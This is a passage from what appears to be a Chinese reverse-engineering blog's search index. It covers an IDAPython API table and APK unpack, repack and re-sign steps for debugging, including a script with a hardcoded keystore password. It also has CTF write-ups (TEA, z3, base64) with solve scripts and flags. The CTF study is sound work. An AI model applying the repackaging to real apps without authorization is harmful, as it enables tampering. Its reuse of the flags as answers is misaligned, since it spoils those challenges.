idautils.Segments() 无 获取第一个段 idc.FirstSeg() idc.get_first_seg() 获取下一个段 参数是当前段的任意地址 返回的是下一个段的地址 idc.NextSeg(addr) idc.get_next_seg(addr) 函数相关操作 作用 老版函数 新版函数 获取指定地址之间的所有函数 Functions(startaddr,endaddr) 无 获取指定地址的函数名 idc.GetFunctionName(addr) idc.get_func_name(addr) 获取函数的注释 idc.GetFunctionCmt get_func_cmt(ea, repeatable) 1是地址 2是0或1 1是获取重复注释 0是获取常规注释 设置函数注释 idc.SetFunctionCmt set_func_cmt(ea, cmt, repeatable) 弹框让用户选择函数，返回的是函数的地址 idc.ChooseFunction(title) idc.choose_func(title) 返回: addr 距离函数的偏移形式 idc.GetFuncOffset(addr) idc.get_func_off_str(addr) 寻找函数结尾,如果函数存在则返回结尾地址,否则返回-1 idc.FindFuncEnd(addr) idc.find_func_end(addr) 设置函数结尾 ida_funcs.func_setstart(addr,newstartaddr) ida_funcs.set_func_start(addr, newstart) 设置函数开头 ida_funcs.func_setstart(addr,newstartaddr) ida_funcs.set_func_start(addr, newstart) 设置地址处的名字 idc.MakeName(addr, name) 与之同名了还有Ex函数 idc.set_name(ea, name, SN_CHECK) Ex函数也使用set_name 获取前一个函数的地址 idc.PrevFunction idc.get_prev_func(ea) 获取下一个函数的地址 idc.NextFunction idc.get_next_func 搜索功能搜索 作用 老版函数 新版函数 查找二进制找到返回地址没找到返回-1(BADADDR) idc.FindBinary idc.find_binary(ea, flag, searchstr, radix=16, from_bc695=False) 返回data的地址，而不是code（注意不是指具体的数据，而是指的data类型） idc.FindData idc.find_data 或者ida_search.find_data 返回code的地址，而不是data idc.FindCode idc.find_code 可以使用 ida_search.find_code 也可以使用 跳转到ea位置 idc.Jump ida_kernwin.jumpto(ea) 校验数据校验函数is_xxxx传入的都是flag，因为需要先获取某个地址处的flag，然后再将获取的flag传入is_xxxx 作用 老版函数 新版函数 获取标志 idc.GetFlags(ea) ida_bytes.get_full_flags(ea) 判断是否是代码，传入标志，根据标志返回True or False idc.isCode(f) ida_bytes.is_code(f) 同上 只不过是判断是否是数据 idc.isData(f) ida_bytes.is_data(f)","categories":[{"name":"工具","slug":"工具","permalink":"https://zzzzsky.github.io/categories/%E5%B7%A5%E5%85%B7/"}],"tags":[{"name":"IDAPython","slug":"IDAPython","permalink":"https://zzzzsky.github.io/tags/IDAPython/"},{"name":"IDA","slug":"IDA","permalink":"https://zzzzsky.github.io/tags/IDA/"}]},{"title":"2道CTF_APK题不能调试的解决方法及引发的思考","slug":"安卓重新签名打包调试","date":"2021-12-04T14:02:00.000Z","updated":"2021-12-05T12:02:16.016Z","comments":true,"path":"2021/12/04/安卓重新签名打包调试/","link":"","permalink":"https://zzzzsky.github.io/2021/12/04/%E5%AE%89%E5%8D%93%E9%87%8D%E6%96%B0%E7%AD%BE%E5%90%8D%E6%89%93%E5%8C%85%E8%B0%83%E8%AF%95/","excerpt":"","text":"2道CTF_APK题不能调试的解决方法及引发的思考前言最近找到2个安卓题目来练习，分析后发现如果可以调试的话会大大降低难度（一道是JEB调试，一道是IDA调试so文件），于是我用工具开始调试，发现都没有办法调试，经过各种查阅资料终于可以调试了，于是写下此文，记录下环境配置。 链接：https://pan.baidu.com/s/1nYwqxmipw_marYN6wKJjAg 提取码：9rxq 题目:CTF_2.apk遇到问题JEB调试APK的时候, 先adb shell， 然后查看进程ID，为4546 123beyond1q:/ # ps | grep &quot;ctf&quot;ps | grep &quot;ctf&quot;u0_a44 4546 1876 964728 83108 d772dcc0 S com.example.ctf 打开JEB附加 没法调试，下面开始解决 解决问题打开Manifest ，发现并没有android:debuggable=&quot;true&quot; 先解包 apktool.bat d CTF_2_.apk 于是用加上后用重新打包 apktool.bat b CTF_2_， 新生成的APK文件在 CTF_2_\\dist中, 这个时候如果直接安装的话会报错 1234C:\\Users\\ZSKY\\Desktop\\新建文件夹\\CTF_2\\CTF_2_\\distλ adb install CTF_2_.apk4685 KB/s (3004999 bytes in 0.626s)Failure [INSTALL_PARSE_FAILED_NO_CERTIFICATES: Failed to collect certificates from /data/app/vmdl625528294.tmp/base.apk: Attempt to get length of null array] 还需要签名才可以 123456789101112131415161718C:\\Users\\ZSKY\\Desktop\\新建文件夹\\CTF_2 λ keytool -genkey -keystore coolapk.keystore -keyalg RSA -validity 10000 -alias coolapk 输入密钥库口令: #123456 再次输入新口令: #123456 您的名字与姓氏是什么? [Unknown]: 您的组织单位名称是什么? [Unknown]: 您的组织名称是什么? [Unknown]: 您所在的城市或区域名称是什么? [Unknown]: 您所在的省/市/自治区名称是什么? [Unknown]: 该单位的双字母国家/地区代码是什么? [Unknown]: CN=Unknown, OU=Unknown, O=Unknown, L=Unknown, ST=Unknown, C=Unknown是否正确? [否]: y 生成签名文件命令: keytool -genkey -keystore 签名文件的文件名 -keyalg RSA -validity 10000 -alias 签名文件别名 这个时候会生成coolapk.keystore签名文件, 然后运行 jarsigner.exe -verbose -keystore coolapk.keystore -storepass 123456 -signedjar CTF_2_new_sign.apk -digestalg SHA1 -sigalg MD5withRSA CTF_2_new.apk coolapk 即可签名 给APK添加签名命令: jarsigner.exe -verbose -keystore coolapk.keystore -storepass 密码 -signedjar 新的APK文件名 -digestalg SHA1 -sigalg MD5withRSA 需要签名的APK文件名 签名文件的别名 这个时候，把之前的安装好的APK删除，然后运行adb install CTF_2_new_sign.apk即可安装成功 再用JEB调试的时候，这里会多一个D标志 下断点输入FLAG，程序就会断下了 题目:CTF_4.apk遇到问题IDA在 检测flag的函数那里下断点，手机输入flag后点注册按钮，IDA总是断不下来，然后下断点的话是橘黄色，后来查阅资料发现是基址的问题，这里libnative-lib.so 文件加载的基址居然是0 IDA如何调试安卓so文件可以参考: https://zzzzsky.com/2021/11/29/IDA%E7%9C%9F%E6%9C%BA%E8%B0%83%E8%AF%95%E5%AE%89%E5%8D%93so%E6%96%87%E4%BB%B6/ 解决问题1、尝试去找加载该so文件的基址然后手动修复 根本找不到该so文件。 2、用CTF_2那个方法把android:debuggable=&quot;true&quot;加上，然后重新打包签名，然后adb install CTF_4.apk的时候遇到了错误 经查阅，此错误是android:extractNativeLibs=&quot;false&quot;的缘故，改为android:extractNativeLibs=&quot;true&quot;即可，我们即加上android:debuggable=&quot;true&quot; 也设置android:extractNativeLibs=&quot;true&quot;重新签名打包，发现可以调试 思考在上一步解决问题之后，还是查看maps文件看基值，当点击注册按钮之后，发现可以发现加载了这个so文件，并且前面有基址，估计是android:extractNativeLibs=&quot;true&quot;的原因 我想测试，如果仅仅设置android:extractNativeLibs=&quot;true&quot; 而 android:debuggable=&quot;false&quot;不变的情况下，能不能通过手动的修复基址来达到IDA调试so的目的，开始测试，android:extractNativeLibs=&quot;true&quot; android:debuggable=&quot;false&quot; 重新打包签名，然后安装, 手机运行CTF_4， 然后查看maps文件有没有加载那个so文件 可以发现，果然加载了,然后准备调试，手机点击注册按钮，IDA弹出 点击same，然后在断点那里断下，不需要修复基址 所以，如果仅仅是IDA调试so的话，不需要JEB调试的话，根本不需要设置android:debuggable=&quot;true&quot;,但是必须得android:extractNativeLibs=&quot;true&quot; 并且这里这个android:extractNativeLibs 如果设置为true或false，感觉有点像PE的那个静态库和动态库 半自动脚本写了个半自动脚本，自动加debug属性，然后重新打包签名，环境为python3.8 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970import sysimport subprocessimport osfrom xml.dom.minidom import parse# 1、先解包APK# 2、打开xml文件分析，android:debuggable 和 android:extractNativeLibs属性# 3、如果没有android:debuggable,则可以加入并且设置为属性为 true# 4、如果有android:debuggable， 则直接设置为true# 5、如果没有android:extractNativeLibs 则不管，如果有且为false，则改为true# 6、apktool重新打包# 7、生成签名文件# 8、将签名加入到apk中def handle_xml(): # 3,4,5 处理XML文件并写回 # AndroidManifest.xml dom = parse(&quot;AndroidManifest.xml&quot;) data = dom.documentElement # android:extractNativeLibs=&quot;true&quot; # android:debuggable=&quot;true&quot; application = data.getElementsByTagName(&quot;application&quot;) print(&quot;[+] 正在修改 android:debuggable 属性&quot;) application[0].setAttribute(&quot;android:debuggable&quot;, &quot;true&quot;) if application[0].getAttribute(&quot;android:extractNativeLibs&quot;) == &#x27;false&#x27;: print(&quot;[+] 正在修改android:extractNativeLibs 属性&quot;) application[0].setAttribute(&quot;android:extractNativeLibs&quot;, &quot;true&quot;) f = open(&quot;AndroidManifest.xml&quot;, &#x27;w&#x27;) dom.writexml(f, encoding=&quot;utf-8&quot;) f.close() with open(&quot;AndroidManifest.xml&quot;, &quot;r&quot;, encoding=&quot;utf-8&quot;) as f: c = f.read() c = c.replace(&#x27;encoding=&quot;utf-8&quot;&#x27;, &#x27;encoding=&quot;utf-8&quot; standalone=&quot;no&quot;&#x27;) f.close() with open(&quot;AndroidManifest.xml&quot;, &quot;w&quot;, encoding=&quot;utf-8&quot;)as f: f.write(c)if __name__ == &quot;__main__&quot;: if len(sys.argv) != 2: print(&quot;[X] 格式有错! python后跟apk名字&quot;) sys.exit(-1) apkpath = sys.argv[1] apkname = os.path.splitext(apkpath)[0] apkdirpath = apkname + &quot;_DIR&quot; # 1、解包APK print(&quot;[+] 解包APK文件&quot;) subprocess.run([&#x27;apktool.bat&#x27;, &#x27;d&#x27;, apkpath, &quot;-o&quot;, apkdirpath]) os.chdir(apkdirpath) # 2、打开xml文件 print(&quot;[+] 当前工作路径为: &quot; + os.getcwd()) handle_xml() print(&quot;[+] 修改XML文件成功&quot;) # 6、重新打包为APK os.chdir(&#x27;../&#x27;) print(&quot;[+] 重新打包APK文件&quot;) print(&quot;[+] 当前工作路径为: &quot; + os.getcwd()) apkpath_new = apkname + &quot;_new.apk&quot; subprocess.run([&#x27;apktool.bat&#x27;, &#x27;b&#x27;, apkdirpath, &quot;-o&quot;, apkpath_new]) # 7、生成签名文件 print(&quot;[+] 密码请输入123456，否则会出错&quot;) # keytool -genkey -keystore 签名文件的文件名 -keyalg RSA -validity 10000 -alias 签名文件别名 subprocess.run([&#x27;keytool&#x27;, &#x27;-genkey&#x27;, &#x27;-keystore&#x27;, apkname + &quot;_new.keystore&quot;, &#x27;-keyalg&#x27;, &#x27;RSA&#x27;, &#x27;-validity&#x27;, &#x27;10000&#x27;, &#x27;-alias&#x27;, apkname]) # 8、给APK文件添加签名 print(f&quot;[+] 给&#123;apkname&#125;_new.apk添加签名&quot;) subprocess.run([&#x27;jarsigner.exe&#x27;, &#x27;-verbose&#x27;, &#x27;-keystore&#x27;, apkname + &quot;_new.keystore&quot;, &#x27;-storepass&#x27;, &#x27;123456&#x27;, &#x27;-signedjar&#x27;, apkname + &#x27;_new_sign.apk&#x27;, &#x27;-digestalg&#x27;, &#x27;SHA1&#x27;, &#x27;-sigalg&#x27;, &#x27;MD5withRSA&#x27;, apkname + &quot;_new.apk&quot;, apkname]) 总结 如果是JEB调试，必须设置android:debuggable=&quot;true&quot; 如果不用JEB，仅仅是IDA调试so文件，不用必须设置android:debuggable=&quot;true&quot;, 但是必须得设置android:extractNativeLibs=&quot;true&quot; 参考文章 https://www.jianshu.com/p/eb766d2bb837 https://www.jianshu.com/p/879d53256ff3","categories":[{"name":"安卓","slug":"安卓","permalink":"https://zzzzsky.github.io/categories/%E5%AE%89%E5%8D%93/"}],"tags":[{"name":"debug","slug":"debug","permalink":"https://zzzzsky.github.io/tags/debug/"}]},{"title":"Python 常用数据类型转换","slug":"python处理数据类型","date":"2021-12-03T09:46:00.000Z","updated":"2021-12-03T09:47:22.856Z","comments":true,"path":"2021/12/03/python处理数据类型/","link":"","permalink":"https://zzzzsky.github.io/2021/12/03/python%E5%A4%84%E7%90%86%E6%95%B0%E6%8D%AE%E7%B1%BB%E5%9E%8B/","excerpt":"","text":"Python 常用数据类型转换在CTF中，经常需要各种数据类型之间的转换 struct模块 官方文档: https://docs.python.org/zh-cn/3.10/library/struct.html C语言数据结构与python bytes之间的转换 ​ 12345678910111213141516171819In [1]: import struct In [2]: struct.pack(&quot;&lt;LLLL&quot;, 1,2,3,4) Out[2]: b&#x27;\\x01\\x00\\x00\\x00\\x02\\x00\\x00\\x00\\x03\\x00\\x00\\x00\\x04\\x00\\x00\\x00&#x27; In [3]: struct.pack(&quot;&lt;LLLL&quot;,&#x27;a&#x27;,2,3,4) --------------------------------------------------------------------------- error Traceback (most recent call last) &lt;ipython-input-3-e0808e208379&gt; in &lt;module&gt; ----&gt; 1 struct.pack(&quot;&lt;LLLL&quot;,&#x27;a&#x27;,2,3,4) error: required argument is not an integer In [4]: c = struct.pack(&#x27;&lt;I&#x27;, ord(&#x27;a&#x27;)) In [5]: b = struct.unpack(&#x27;&lt;I&#x27;, c) In [6]: b[0] Out[6]: 97 binascii模块二进制和ASCII之间的转换 官方文档: https://docs.python.org/zh-cn/3.7/library/binascii.html 12345678910111213141516In [1]: import binasciiIn [2]: binascii.hexlify(b&#x27;12345&#x27;)Out[2]: b&#x27;3132333435&#x27;In [3]: binascii.hexlify(b&#x27;12345&#x27;, &#x27;-&#x27;)Out[3]: b&#x27;31-32-33-34-35&#x27;In [4]: binascii.unhexlify(b&#x27;3132333435&#x27;)Out[4]: b&#x27;12345&#x27;In [5]: binascii.crc32(b&#x27;123&#x27;)Out[5]: 2286445522In [6]: hex(binascii.crc32(b&#x27;123&#x27;))Out[6]: &#x27;0x884863d2&#x27; 进制之间的转换1234567891011121314151617In [7]: int(0x12)Out[7]: 18In [8]: int(&#x27;23&#x27;)Out[8]: 23In [9]: int(&#x27;1111&#x27;, 2)Out[9]: 15In [10]: int(&#x27;11&#x27;, 16)Out[10]: 17In [11]: bin(123)Out[11]: &#x27;0b1111011&#x27;In [12]: int(&#x27;1111011&#x27;, 2)Out[12]: 123 bytes和数字之间的转换1234567891011121314151617181920212223In [17]: from Crypto.Util.number import long_to_bytes, bytes_to_longIn [18]: bytes_to_long(b&#x27;flag&#x27;)Out[18]: 1718378855In [19]: hex(1718378855)Out[19]: &#x27;0x666c6167&#x27;In [20]: from binascii import *In [21]: unhexlify(1718378855)---------------------------------------------------------------------------TypeError Traceback (most recent call last)&lt;ipython-input-21-43c0727e7de8&gt; in &lt;module&gt;----&gt; 1 unhexlify(1718378855)TypeError: argument should be bytes, buffer or ASCII string, not &#x27;int&#x27;In [22]: unhexlify(&#x27;666c6167&#x27;)Out[22]: b&#x27;flag&#x27;In [23]: long_to_bytes(1718378855)Out[23]: b&#x27;flag&#x27; 列表和bytes,str类型转换1234567891011121314151617In [28]: a = b&#x27;flag&#x27;In [29]: b = list(a)In [30]: bOut[30]: [102, 108, 97, 103]In [31]: bytes(b)Out[31]: b&#x27;flag&#x27; In [36]: a = list(&quot;flag&quot;)In [37]: aOut[37]: [&#x27;f&#x27;, &#x27;l&#x27;, &#x27;a&#x27;, &#x27;g&#x27;]In [38]: &quot;&quot;.join(a)Out[38]: &#x27;flag&#x27;","categories":[{"name":"python","slug":"python","permalink":"https://zzzzsky.github.io/categories/python/"}],"tags":[{"name":"struct","slug":"struct","permalink":"https://zzzzsky.github.io/tags/struct/"}]},{"title":"2021西湖论剑_RE_WP","slug":"2021西湖论剑_RE_WP","date":"2021-12-02T12:37:00.000Z","updated":"2021-12-02T12:37:36.844Z","comments":true,"path":"2021/12/02/2021西湖论剑_RE_WP/","link":"","permalink":"https://zzzzsky.github.io/2021/12/02/2021%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%91_RE_WP/","excerpt":"","text":"2021西湖论剑_RE_WPTacticalArmedIDA打开发现有TLS回调函数，如果没有调试就初始化4个值 直接patch，强制jmp到4010F1的位置 第50行，v21那里是每次执行的指令 写OD脚本，在004014A3和 40146D位置下断点，OD运行脚本，打印出下图中一轮来 12345678910111213141516var fvar xmov f,&quot;C:\\\\Users\\\\ZSKY\\\\Desktop\\\\xihulunjian\\\\log.txt&quot;vv:RUNcmp eip,004014A3je stopcmp eip,40146Djnz vvstiopcode eipeval &quot;&#123;eip&#125; : &#123;$RESULT_1&#125;&quot;wrta f,$RESULTjmp vvstop:pause 1234567891011121314151617181920212223242526272829303132335AC720 : mov ecx,dword ptr ds:[0x405748]5AC720 : sub ecx,0x7E5A96D25AC720 : mov dword ptr ds:[0x405748],ecx5AC720 : mov edx,dword ptr ds:[0x40564C]5AC720 : shr edx,0x55AC720 : mov eax,dword ptr ds:[0x405004]5AC720 : add eax,edx5AC720 : mov ecx,dword ptr ds:[0x405748]5AC720 : add ecx,dword ptr ds:[0x40564C]5AC720 : xor eax,ecx5AC720 : mov edx,dword ptr ds:[0x40564C]5AC720 : shl edx,0x45AC720 : mov ecx,dword ptr ds:[0x405000]5AC720 : add ecx,edx5AC720 : xor eax,ecx5AC720 : mov edx,dword ptr ds:[0x405648]5AC720 : add edx,eax5AC720 : mov dword ptr ds:[0x405648],edx5AC720 : mov eax,dword ptr ds:[0x405648]5AC720 : shr eax,0x55AC720 : mov ecx,dword ptr ds:[0x40500C]5AC720 : add ecx,eax5AC720 : mov edx,dword ptr ds:[0x405748]5AC720 : add edx,dword ptr ds:[0x405648]5AC720 : xor ecx,edx5AC720 : mov eax,dword ptr ds:[0x405648]5AC720 : shl eax,0x45AC720 : mov edx,dword ptr ds:[0x405008]5AC720 : add edx,eax5AC720 : xor ecx,edx5AC720 : mov eax,dword ptr ds:[0x40564C]5AC720 : add eax,ecx5AC720 : mov dword ptr ds:[0x40564C],eax 在IDA中随便找个地方patch下上面汇编，然后F5 稍微整理整理 这不就是tea结构吗，只不过delta换了，然后循环变为了33轮,提取出数据写脚本即可 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647#include &lt;stdio.h&gt;#include &lt;stdint.h&gt;unsigned char enc_flag[] = &#123; 0xED, 0x1D, 0x2F, 0x42, 0x72, 0xE4, 0x85, 0x14, 0xD5, 0x78, 0x55, 0x03, 0xA2, 0x80, 0x6B, 0xBF, 0x45, 0x72, 0xD7, 0x97, 0xD1, 0x75, 0xAE, 0x2D, 0x63, 0xA9, 0x5F, 0x66, 0x74, 0x6D, 0x2E, 0x29, 0xC1, 0xFC, 0x95, 0x97, 0xE9, 0xC8, 0xB5, 0x0B, 0&#125;;uint32_t key[] = &#123; 0x7CE45630, 0x58334908, 0x66398867, 0x0C35195B1&#125;;void decrypt(uint32_t *v, uint32_t *k, uint32_t *pSum)&#123; uint32_t v0 = v[0], v1 = v[1], i; uint32_t delta = 0x7E5A96D2; uint32_t k0 = k[0], k1 = k[1], k2 = k[2], k3 = k[3]; for (i = 0; i &lt; 33; i++) &#123; v1 -= ((v0 &lt;&lt; 4) + k2) ^ (v0 + *pSum) ^ ((v0 &gt;&gt; 5) + k3); v0 -= ((v1 &lt;&lt; 4) + k0) ^ (v1 + *pSum) ^ ((v1 &gt;&gt; 5) + k1); *pSum += delta; &#125; v[0] = v0; v[1] = v1;&#125;int main()&#123; unsigned sum = 0; for (int i = 0; i &lt; 33 * 5; i++) &#123; sum -= 0x7E5A96D2; &#125; uint32_t *pFlag = (uint32_t *)enc_flag; for (int i = 0; i &lt; 5; i++) &#123; decrypt(pFlag + (4 - i) * 2, key, &amp;sum); &#125; printf(&quot;%s&quot;, pFlag); return 0;&#125;# kgD1ogB2yGa2roiAeXiG8_aqnLzCJ_rFHSPrn55K flag为 kgD1ogB2yGa2roiAeXiG8_aqnLzCJ_rFHSPrn55K gghdlIDA打开程序 直接F5分析一波 case 0是输入flag，case 5是验证flag是否正确，case 6是对flag中的每个字符进行加密，case 7是将加密后的每个字符后的数据与程序中生成的数据比较 调试起来 加密后v127指向的值为 2, 3, 2, 2, 2, 2, 2, 3 ， 而ord(‘A’) = 0x41, 二进制为 01000001 也就是把2换为0， 把3换为1 然后运行来到case 7的位置 v126的值为3, 3, 2, 3, 3, 3, 2, 3 转为二进制 0b11011101 1234Python&gt;0b110111010xddPython&gt;0xdd ^ ord(&#x27;A&#x27;)0x9c 然后下面的同理，发现全都是xor 0x9c, 一步步调试将对比的数据v123提取出来，然后3变为1，2变为0，转为2进制，再xor 0x9c即为flag 1234567enc = [0b11011000, 0b11011101, 0b11001111, 0b11011111, 0b11001000, 0b11011010, 0b11100111, 0b10101100, 0b10101010, 0b10101110, 0b10100101, 0b10101101, 0b10100101, 0b10101010, 0b10101110, 0b10110001, 0b11111101, 0b11111110, 0b11111101, 0b11111000, 0b10110001, 0b10101000, 0b10101100, 0b11111111, 0b10100100, 0b10110001, 0b10100100, 0b10101111, 0b10101101, 0b10100100, 0b10110001, 0b11111010, 0b10101100, 0b11111101, 0b10101010, 0b11111110, 0b10101101, 0b10100100, 0b10101010, 0b10101000, 0b10100100, 0b10101110, 0b11111111, 0b11100001]flag = [chr(i ^ 0x9c) for i in enc]print(&quot;&quot;.join(flag))# DASCTF&#123;06291962-abad-40c8-8318-f0a6b186482c&#125; 验证下 flag正确，flag为 DASCTF&#123;06291962-abad-40c8-8318-f0a6b186482c&#125; RORIDA打开分析 先找出byte_405000的索引，然后Z3解即可 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667from z3 import *ENC_FLAG = [0x65, 0x55, 0x24, 0x36, 0x9D, 0x71, 0xB8, 0xC8, 0x65, 0xFB, 0x87, 0x7F, 0x9A, 0x9C, 0xB1, 0xDF, 0x65, 0x8F, 0x9D, 0x39, 0x8F, 0x11, 0xF6, 0x8E, 0x65, 0x42, 0xDA, 0xB4, 0x8C, 0x39, 0xFB, 0x99, 0x65, 0x48, 0x6A, 0xCA, 0x63, 0xE7, 0xA4, 0x79]byte_405000 = [0x65, 0x08, 0xF7, 0x12, 0xBC, 0xC3, 0xCF, 0xB8, 0x83, 0x7B, 0x02, 0xD5, 0x34, 0xBD, 0x9F, 0x33, 0x77, 0x76, 0xD4, 0xD7, 0xEB, 0x90, 0x89, 0x5E, 0x54, 0x01, 0x7D, 0xF4, 0x11, 0xFF, 0x99, 0x49, 0xAD, 0x57, 0x46, 0x67, 0x2A, 0x9D, 0x7F, 0xD2, 0xE1, 0x21, 0x8B, 0x1D, 0x5A, 0x91, 0x38, 0x94, 0xF9, 0x0C, 0x00, 0xCA, 0xE8, 0xCB, 0x5F, 0x19, 0xF6, 0xF0, 0x3C, 0xDE, 0xDA, 0xEA, 0x9C, 0x14, 0x75, 0xA4, 0x0D, 0x25, 0x58, 0xFC, 0x44, 0x86, 0x05, 0x6B, 0x43, 0x9A, 0x6D, 0xD1, 0x63, 0x98, 0x68, 0x2D, 0x52, 0x3D, 0xDD, 0x88, 0xD6, 0xD0, 0xA2, 0xED, 0xA5, 0x3B, 0x45, 0x3E, 0xF2, 0x22, 0x06, 0xF3, 0x1A, 0xA8, 0x09, 0xDC, 0x7C, 0x4B, 0x5C, 0x1E, 0xA1, 0xB0, 0x71, 0x04, 0xE2, 0x9B, 0xB7, 0x10, 0x4E, 0x16, 0x23, 0x82, 0x56, 0xD8, 0x61, 0xB4, 0x24, 0x7E, 0x87, 0xF8, 0x0A, 0x13, 0xE3, 0xE4, 0xE6, 0x1C, 0x35, 0x2C, 0xB1, 0xEC, 0x93, 0x66, 0x03, 0xA9, 0x95, 0xBB, 0xD3, 0x51, 0x39, 0xE7, 0xC9, 0xCE, 0x29, 0x72, 0x47, 0x6C, 0x70, 0x15, 0xDF, 0xD9, 0x17, 0x74, 0x3F, 0x62, 0xCD, 0x41, 0x07, 0x73, 0x53, 0x85, 0x31, 0x8A, 0x30, 0xAA, 0xAC, 0x2E, 0xA3, 0x50, 0x7A, 0xB5, 0x8E, 0x69, 0x1F, 0x6A, 0x97, 0x55, 0x3A, 0xB2, 0x59, 0xAB, 0xE0, 0x28, 0xC0, 0xB3, 0xBE, 0xCC, 0xC6, 0x2B, 0x5B, 0x92, 0xEE, 0x60, 0x20, 0x84, 0x4D, 0x0F, 0x26, 0x4A, 0x48, 0x0B, 0x36, 0x80, 0x5D, 0x6F, 0x4C, 0xB9, 0x81, 0x96, 0x32, 0xFD, 0x40, 0x8D, 0x27, 0xC1, 0x78, 0x4F, 0x79, 0xC8, 0x0E, 0x8C, 0xE5, 0x9E, 0xAE, 0xBF, 0xEF, 0x42, 0xC5, 0xAF, 0xA0, 0xC2, 0xFA, 0xC7, 0xB6, 0xDB, 0x18, 0xC4, 0xA6, 0xFE, 0xE9, 0xF5, 0x6E, 0x64, 0x2F, 0xF1, 0x1B, 0xFB, 0xBA, 0xA7, 0x37, 0x8F]indexs = []for i in range(len(ENC_FLAG)): indexs.append(byte_405000.index(ENC_FLAG[i]))v6 = [0] * 8v6[0] = 128v6[1] = 64v6[2] = 32v6[3] = 16v6[4] = 8v6[5] = 4v6[6] = 2v6[7] = 1flag = [BitVec(&quot;flag%d&quot; % i, 8) for i in range(40)]s = Solver()for i in range(0, 40, 8): for j in range(8): v5 = ((v6[j] &amp; flag[i + 3]) &lt;&lt; (8 - (3 - j) % 8)) | ((v6[j] &amp; flag[i + 3]) &gt;&gt; ((3 - j) % 8)) | ((v6[j] &amp; flag[i + 2]) &lt;&lt; (8 - (2 - j) % 8)) | ((v6[j] &amp; flag[i + 2]) &gt;&gt; ((2 - j) % 8)) | ((v6[j] &amp; flag[i + 1]) &lt;&lt; (8 - (1 - j) % 8)) | ((v6[j] &amp; flag[i + 1]) &gt;&gt; ((1 - j) % 8)) | ((v6[j] &amp; flag[i]) &lt;&lt; (8 - -j % 8)) | ((v6[j] &amp; flag[i]) &gt;&gt; (-j % 8)) index = ((v6[j] &amp; flag[i + 7]) &lt;&lt; (8 - (7 - j) % 8)) | ((v6[j] &amp; flag[i + 7]) &gt;&gt; ((7 - j) % 8)) | ((v6[j] &amp; flag[i + 6]) &lt;&lt; (8 - (6 - j) % 8)) | ((v6[j] &amp; flag[i + 6]) &gt;&gt; ((6 - j) % 8) ) | ((v6[j] &amp; flag[i + 5]) &lt;&lt; (8 - (5 - j) % 8)) | ((v6[j] &amp; flag[i + 5]) &gt;&gt; ((5 - j) % 8)) | ((v6[j] &amp; flag[i + 4]) &lt;&lt; (8 - (4 - j) % 8)) | ((v6[j] &amp; flag[i + 4]) &gt;&gt; ((4 - j) % 8)) | v5 s.add(index == indexs[i+j])assert s.check() == satm = s.model()flag = [chr(m[i].as_long()) for i in flag]print(&quot;DASCTF&#123;&quot; + &quot;&quot;.join(flag) + &quot;&#125;&quot;)# DASCTF&#123;Q5la5_3KChtem6_HYHk_NlHhNZz73aCZeK05II96&#125; 虚假的粉丝IDA打开程序分析 \\ 输入3个数字 文件序号 读取此文件的偏移 从偏移处读多少个字节 然后下面判断读取的数据Buffer[0] != &#39;U&#39; || Buffer[39] != &#39;S&#39; 写脚本判断哪个文件含有这2个字母 12345678for i in range(1, 5317): filename = &quot;f/ASCII-faded &quot; + str(i).zfill(4) + &quot;.txt&quot; f = open(filename, &#x27;r&#x27;, encoding=&quot;utf-8&quot;) c = f.read() if &#x27;U&#x27; in c and &#x27;S&#x27; in c: print(filename) f.close()# f/ASCII-faded 4157.txt 于是打开找到了 UzNDcmU3X0szeSUyMCUzRCUyMEFsNE5fd0FsSzNS 将其base64解密为S3Cre7_K3y%20%3D%20Al4N_wAlK3R URL_decode后为 S3Cre7_K3y = Al4N_wAlK3R 偏移是0x45E(1118), 输入的三个数字是4157, 1118, 40，然后输入 Al4N_wAlK3R 最终/f/ASCII-faded 5315.txt 会被解密，打开即可看到flag flag为 A_TrUe_AW_f4ns 题目附件链接：https://pan.baidu.com/s/1Manwxlun-0gK4ZdkzBU0Zw提取码：sj8s","categories":[{"name":"CTF","slug":"CTF","permalink":"https://zzzzsky.github.io/categories/CTF/"}],"tags":[{"name":"CTFWP","slug":"CTFWP","permalink":"https://zzzzsky.github.io/tags/CTFWP/"},{"name":"z3","slug":"z3","permalink":"https://zzzzsky.github.io/tags/z3/"}]},{"title":"NCTF2021_RE_WP","slug":"NCTF2021_RE_WP","date":"2021-11-29T06:41:34.000Z","updated":"2021-11-29T11:44:44.992Z","comments":true,"path":"2021/11/29/NCTF2021_RE_WP/","link":"","permalink":"https://zzzzsky.github.io/2021/11/29/NCTF2021_RE_WP/","excerpt":"","text":"NCTF2021_RE_WPHello せかい记事本都能做的题.IDA打开直接看到flag flag为 NCTF&#123;We1come_2_Reverse_Engineering&#125; Shadowbringerbase64换了2次表，调试起来找到表，逆回去即可 写脚本解密 1234567891011121314import base64flag = &quot;U&gt;F2UsQXN`5sXMELT=:7M_2&lt;X]^1ThaWF0=KM?9IUhAsTM5:T==_Ns&amp;&lt;Vhb!&quot;std_table = &#x27;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/&#x27;my_table = &#x27;#$%&amp;\\x27()*+,-.s0123456789:;&lt;=&gt;?@ABCDEFGHIJKLMNOPQRSTUVWXYZ[h]^_`ab&#x27;my_table2 = &#x27;ba`_^]h[ZYXWVUTSRQPONMLKJIHGFEDCBA@?&gt;=&lt;;:9876543210s.-,+*)(\\x27&amp;%$#&#x27;flag = flag.translate(str.maketrans(my_table2, std_table))flag = flag.replace(&quot;!&quot;, &#x27;=&#x27;).encode() # &quot;6G074JP+s)WV:Z+T&lt;&amp;(Q18`Ks)WV:Y4hs9[h:YCS?&amp;0`&quot;flag = base64.b64decode(flag).decode()flag = flag.translate(str.maketrans(my_table, std_table))print(base64.b64decode(flag))# NCTF&#123;H0m3_r1d1n9_h0m3_dy1n9_h0p3&#125; flag 为 NCTF&#123;H0m3_r1d1n9_h0m3_dy1n9_h0p3&#125; 鲨鲨的秘密这个题跟西湖论剑那个第一个RE题好像 loc_404E3B为执行的指令，因为每次就33条汇编，也不长，直接调试把第一轮所有的汇编拿出来分析 12345678910111213141516171819202122232425262728293031323334mov ds:dword_404E50, 0FFFFFFFFh # dword_404E50 = -1mov ecx, ds:Imov dl, [ecx+4049F8h] # flag[0]mov byte ptr ds:dword_404E4C, dl movzx eax, byte ptr 